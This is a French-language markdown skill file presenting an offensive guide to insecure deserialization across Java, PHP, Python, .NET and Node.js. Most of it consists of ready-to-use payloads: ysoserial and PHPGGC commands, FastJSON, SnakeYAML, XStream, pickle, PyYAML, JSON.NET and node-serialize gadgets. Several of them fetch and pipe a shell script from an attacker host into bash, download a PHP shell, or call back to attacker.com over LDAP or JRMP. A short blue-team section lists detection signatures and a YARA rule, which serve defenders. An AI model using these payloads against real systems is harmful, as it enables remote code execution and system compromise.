---
name: deserialization-attacks
description: Guide complet d'attaque par désérialisation — Java, PHP, Python, .NET, Node.js — outils, payloads et détection
category: cybersecurite
---

# Désérialisation — Attaques Avancées

## Principe Général

La désérialisation non sécurisée convertit des données sérialisées en objets sans valider leur intégrité. L'attaquant modifie le flux sérialisé pour instancier des objets arbitraires, menant à RCE, injection ou escalade de privilèges.

## Java — Désérialisation

### Détection
```bash
# Signature Java serialization dans le traffic
# Magic bytes: AC ED 00 05 (rO0 en base64)
echo "rO0..." | base64 -d | xxd | head

# Recherche dans le code source
grep -r "ObjectInputStream" .
grep -r "readObject" .
grep -r "Serializable" .
grep -r "java.io.Serializable" **/*.java
```

### Outils

**ysoserial** — le couteau suisse:
```bash
java -jar ysoserial-all.jar CommonsCollections1 'curl http://attacker/shell.sh|bash'
java -jar ysoserial-all.jar CommonsCollections5 'wget -O /tmp/shell.php http://attacker/shell.php'
java -jar ysoserial-all.jar JRMPClient 'attacker.com:1099'
java -jar ysoserial-all.jar JdbcRowSetImpl 'ldap://attacker.com:1389/Exploit'
```

**ysoserial — Générateurs (gadget chains):**
```
CommonsCollections1-7
CommonsBeanutils1-2
Jdk7u21, Jdk8u20
URLDNS, DNS
JRMPClient, JRMPListener
Hibernate1-2
JBossInterceptors1
Wicket1
Click1
C3P0, C3P02
BeanShell1
Clojure1
Spring1-2
JSON1
Rome, ROME
Fastjson
```

### Blind Deserialization via RMI/JRMP
```bash
# Côté attaquant : lancer un listener JRMP
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'curl http://attacker/'

# Côté victime : forcer la connexion au serveur RMI malveillant
java -jar ysoserial-all.jar JRMPClient 'attacker.com:1099'
```

### FastJSON Exploitation
```json
// FastJSON < 1.2.48 — désérialisation avec @type
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### SnakeYAML
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]
```

### XStream
```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.beanshell.remote.BshRemote">
      <source>Runtime.exec("curl http://attacker/")</source>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

## PHP — Désérialisation

### Magic Methods Exploitées
```php
__wakeup()     // Appelé lors de la désérialisation
__destruct()   // Appelé à la destruction de l'objet
__toString()   // Appelé quand l'objet est traité comme string
__call()       // Appelé pour méthode inaccessible
__get()        // Appelé pour propriété inaccessible
__sleep()      // Appelé lors de la sérialisation
```

### Détection
```bash
# Signature PHP serialization
# a:2:{s:4:"name";s:6:"attacker";...}
# O:8:"stdClass":1:{s:4:"test";s:4:"test";}

# Code source
grep -r "unserialize" .
grep -r "serialize" .

# Dans les cookies, input, paramètres
# Sérialisation PHP en base64 souvent
```

### Exploitation
```php
// Exemple gadget chain (sans gadgets connus)
// Utilisation des classes natives du framework (Laravel, Symfony, etc.)

// PHPGGC — le ysoserial PHP
phpggc Laravel/RCE1 system 'id'
phpggc SwiftMailer/FW1 system 'id'
phpggc CodeIgniter/RCE1 system 'cat /etc/passwd'

// POP Chain basique
class Evil {
    public $command = 'id';
    public function __destruct() {
        system($this->command);
    }
}
echo serialize(new Evil());
// O:4:"Evil":1:{s:7:"command";s:2:"id";}
```

### Phar Deserialization
```php
// Désérialisation via les métadonnées du fichier Phar
// Le wrapper phar:// désérialise le meta-data
$phar = new Phar('exploit.phar');
$phar->setMetadata(new Evil());
// Ensuite: phar://exploit.phar/test.txt
```

## Python — Désérialisation

### Pickle
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker/shell.sh|bash',))

payload = pickle.dumps(Evil())
print(payload.hex())

# En base64 pour blind RCE
import base64
print(base64.b64encode(payload).decode())
```

### Détection Python
```bash
# Signature pickle
# \x80\x04\x95...  (protocol 4)
# \x80\x03}...     (protocol 3)
# Base64 souvent: gASV...

grep -r "pickle.loads" .
grep -r "pickle.load" .
grep -r "dill.load" .
grep -r "yaml.load" .  # (sans SafeLoader)
grep -r "shelve.open" .
```

### PyYAML
```python
# Exploitation PyYAML sans SafeLoader
import yaml
yaml.load("!!python/object/new:os.system ['curl http://attacker/']")

# Autres gadgets PyYAML
!!python/object/apply:subprocess.check_output ['curl http://attacker']
!!python/object/apply:os.popen ['curl http://attacker']
!!python/object/apply:builtins.eval ["__import__('os').system('id')"]
```

### JSONPickle / Others
```python
# jsonpickle — désérialisation dangereuse
{"py/reduce": [{"py/type": "subprocess.check_output"}, {"py/tuple": ["id"]}]}
```

## .NET — Désérialisation

### Détection
```bash
# BinaryFormatter
# Magic bytes: 00 01 00 00 00 FF FF FF FF
# LosFormatter, NetDataContractSerializer, SoapFormatter
# XMLSerializer (certains cas)

grep -r "BinaryFormatter" .
grep -r "Deserialize" .
grep -r "TypeNameHandling" .
grep -r "JavaScriptSerializer" .
grep -r "JsonConvert" .
```

### Outils

**ysoserial.net:**
```powershell
ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc.exe"
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell -enc BASe64..."
ysoserial.exe -f LosFormatter -g ActivitySurrogateSelectorFromFile -c "exploit.cs"
```

**ViewState exploitation:**
```bash
# ASP.NET ViewState — MachineKey connu
.\ysoserial.exe -p ViewState -g TextBox -c "id" --path="/target.aspx" --generator=EDD7CC1B --viewstateuserkey="supersecret" --validationalg="SHA1" --validationkey="..." --decryptionalg="AES" --decryptionkey="..."
```

### JSON.NET
```json
// TypeNameHandling activé
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": ["cmd", "/c calc.exe"],
  "ObjectInstance": {"$type": "System.Diagnostics.Process, System"}
}
```

## Node.js — Désérialisation

### node-serialize
```javascript
// Utilisation de node-serialize (déprécié mais présent)
var serialize = require('node-serialize');
var payload = {
  rce: function(){ require('child_process').exec('id', function(e,o){console.log(o);}); }
};
console.log(serialize.serialize(payload));
```

### Funks like IIFE
```javascript
// Immediately Invoked Function Expression dans sérialisation
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id', console.log)}()"}
```

## Détection WAF / Blue Team

### Indicateurs dans le trafic:
```bash
# Magic bytes Java: AC ED 00 05
# PHP: O:[0-9]+:"[a-zA-Z_]+":[0-9]+:{
# Python pickle: \x80\x04 ou gASV
# .NET BinaryFormatter: 00 01 00 00 00
# Base64 suspect dans les cookies/paramètres

# YARA rules pour détection
rule java_deserialization {
  strings:
    $magic = { AC ED 00 05 }
  condition:
    $magic
}
```

## Ressources

- **ysoserial**: https://github.com/frohoff/ysoserial
- **ysoserial.net**: https://github.com/pwntester/ysoserial.net
- **PHPGGC**: https://github.com/ambionics/phpggc
- **HackTricks Deserialization**: https://book.hacktricks.wiki/en/pentesting-web/deserialization/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- **Marshalsec**: https://github.com/mbechler/marshalsec
- **PortSwigger Research**: https://portswigger.net/research